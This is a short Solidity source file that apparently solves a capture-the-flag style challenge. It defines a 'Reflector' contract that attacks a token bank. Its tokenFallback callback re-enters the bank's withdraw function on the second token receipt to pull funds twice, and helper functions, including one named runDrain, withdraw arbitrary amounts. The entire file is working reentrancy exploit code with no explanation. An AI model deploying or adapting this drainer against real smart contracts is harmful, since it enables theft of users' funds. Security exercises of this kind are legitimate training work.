pragma solidity ^0.8.10;

interface ITokenReceiver {
	// TODO find out memory /  storage?
    function tokenFallback(address from, uint256 value, bytes memory data) external;
}

interface IBank {
    function withdraw(uint256 amount) external;
}

interface IToken {
    function transfer(address to, uint256 value) external returns (bool success);
}

contract Reflector is ITokenReceiver {
	uint256 _step = 0;
	IBank _bank;
	IToken _token;

	constructor(IBank bank, IToken token) {
		_bank = bank;
		_token = token;
	}

	function tokenFallback(address from, uint256 value, bytes memory data) external {
		_step ++;

		if (_step == 1) {
			// nothing, receiving from player

		} else if (_step == 2) {
			// reflect
			_bank.withdraw(250000 * 10**18);

		} else if (_step == 3) {
			// nothing more

		}

	}

	function runWithdraw() public {
		_bank.withdraw(250000 * 10**18);
	}

	function runTransfer(address to, uint256 amount) public {
		_token.transfer(to, amount);
	}

	function runDrain(uint256 amount) public {
		_bank.withdraw(amount);
	}
}
